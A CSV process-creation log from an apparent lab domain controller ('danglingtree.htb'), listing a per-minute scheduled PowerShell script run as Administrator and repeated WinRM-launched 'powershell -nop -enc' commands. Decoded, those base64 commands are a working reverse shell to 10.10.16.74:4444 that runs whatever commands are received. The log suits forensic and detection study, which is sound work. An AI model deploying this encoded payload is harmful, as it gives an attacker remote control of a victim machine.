"TimeGenerated","Computer","User","Image","CommandLine","ParentImage","ParentCommandLine","ProcessGuid","ParentProcessGuid"
"11/8/2026, 11:58:37.888911 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0e6d-6a7b-d504-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:57:37.887148 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0e31-6a7b-cc04-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:56:37.888695 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0df5-6a7b-c404-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:56:22.460293 am","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-0de6-6a7b-c104-000000003200","7e3eed90-0de6-6a7b-bf04-000000003200"
"11/8/2026, 11:56:21.821159 am","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-0de5-6a7b-bd04-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 11:55:37.887678 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0db9-6a7b-b804-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:54:37.884977 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0d7d-6a7b-b104-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:53:37.887578 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0d41-6a7b-ab04-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:53:10.57931 am","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-0d26-6a7b-a804-000000003200","7e3eed90-0d26-6a7b-a704-000000003200"
"11/8/2026, 11:53:09.911098 am","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-0d25-6a7b-a504-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 11:52:37.88566 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0d05-6a7b-a004-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:51:37.89384 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0cc9-6a7b-9304-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:50:37.885746 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0c8d-6a7b-8704-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:49:37.894851 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0c51-6a7b-7d04-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:49:33.435236 am","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-0c4d-6a7b-7b04-000000003200","7e3eed90-0c4d-6a7b-7a04-000000003200"
"11/8/2026, 11:49:32.767107 am","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-0c4c-6a7b-7804-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 11:48:37.888623 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0c15-6a7b-7204-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:47:37.89295 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0bd9-6a7b-6904-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:46:37.885302 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0b9d-6a7b-6204-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:46:31.803115 am","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-0b97-6a7b-6004-000000003200","7e3eed90-0ade-6a7b-4404-000000003200"
"11/8/2026, 11:46:13.830119 am","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-0b85-6a7b-5c04-000000003200","7e3eed90-0ade-6a7b-4404-000000003200"
"11/8/2026, 11:46:13.5943 am","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-0b85-6a7b-5a04-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 11:45:37.885009 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0b61-6a7b-5504-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:45:30.168648 am","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-0b5a-6a7b-5304-000000003200","7e3eed90-0ade-6a7b-4404-000000003200"
"11/8/2026, 11:45:29.776282 am","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-0b59-6a7b-5104-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
